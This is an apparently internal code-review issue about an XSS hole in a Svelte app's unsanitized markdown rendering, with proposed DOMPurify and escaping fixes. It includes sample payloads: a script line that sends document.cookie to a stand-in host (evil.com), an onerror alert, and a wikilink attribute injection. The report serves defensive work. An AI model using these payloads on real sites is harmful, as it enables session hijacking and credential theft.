---
status: complete
priority: p1
issue_id: "003"
tags: [code-review, security, critical, xss]
dependencies: []
---

# XSS via Unsanitized Markdown Rendering

## Problem Statement

The `marked` library parses markdown and renders it via `{@html html}` in Svelte without any sanitization. Markdown files can contain raw HTML that will be rendered, enabling XSS attacks.

**Why it matters**: Session hijacking, credential theft, defacement, arbitrary JavaScript execution in user context.

## Findings

### Security Sentinel Agent

**File**: `src/lib/utils/markdown.ts:35-37`
```typescript
export function parseMarkdown(content: string): string {
    return marked.parse(content, { async: false }) as string;  // No sanitization
}
```

**File**: `src/lib/components/NoteCard.svelte:422`
```svelte
{@html html}  // Direct HTML injection into DOM
```

**Attack Vector**: Markdown files can contain raw HTML:
```markdown
# Normal Note
<script>document.location='https://evil.com/steal?c='+document.cookie</script>
<img src=x onerror="alert(document.cookie)">
```

### Additional XSS Vector in Wikilinks

**File**: `src/lib/utils/markdown.ts:27-30`
```typescript
renderer(token) {
    const t = token as WikilinkToken;
    return `<button type="button" class="wikilink" data-target="${t.target}">${t.alias}</button>`;
    // t.target and t.alias are not HTML-escaped
}
```

A wikilink like `[[" onclick="alert(1)" x="]]` produces injectable attributes.

## Proposed Solutions

### Option A: Use DOMPurify (Recommended)
- **Description**: Sanitize marked output with DOMPurify
- **Pros**: Industry-standard solution, well-tested
- **Cons**: Adds dependency (~7KB gzipped)
- **Effort**: Small (15 minutes)
- **Risk**: Low

```typescript
import DOMPurify from 'isomorphic-dompurify';

export function parseMarkdown(content: string): string {
    const html = marked.parse(content, { async: false }) as string;
    return DOMPurify.sanitize(html);
}
```

### Option B: Configure Marked to Strip HTML
- **Description**: Set `marked({ html: false })` to skip HTML blocks
- **Pros**: No new dependency
- **Cons**: Removes legitimate HTML use cases, doesn't fix wikilink XSS
- **Effort**: Small
- **Risk**: Medium (functionality loss)

### Option C: Escape Wikilink Attributes
- **Description**: HTML-escape `t.target` and `t.alias` before interpolation
- **Pros**: Fixes wikilink-specific XSS
- **Cons**: Doesn't address main markdown XSS
- **Effort**: Small
- **Risk**: Low

## Recommended Action

**Option A + Option C** - Use DOMPurify for general sanitization AND escape wikilink attributes for defense in depth.

## Technical Details

**Affected files**:
- `src/lib/utils/markdown.ts`
- `package.json` (add `isomorphic-dompurify`)

**Install**:
```bash
npm install isomorphic-dompurify
```

## Acceptance Criteria

- [ ] `<script>` tags in markdown are stripped
- [ ] Event handlers (onclick, onerror) are removed
- [ ] Wikilink targets with quotes are safely escaped
- [ ] Normal markdown rendering still works

## Work Log

| Date | Action | Learnings |
|------|--------|-----------|
| 2026-01-15 | Created | Identified by security-sentinel agent |

## Resources

- PR: feat/user-management-canvas-publishing
- DOMPurify: https://github.com/cure53/DOMPurify
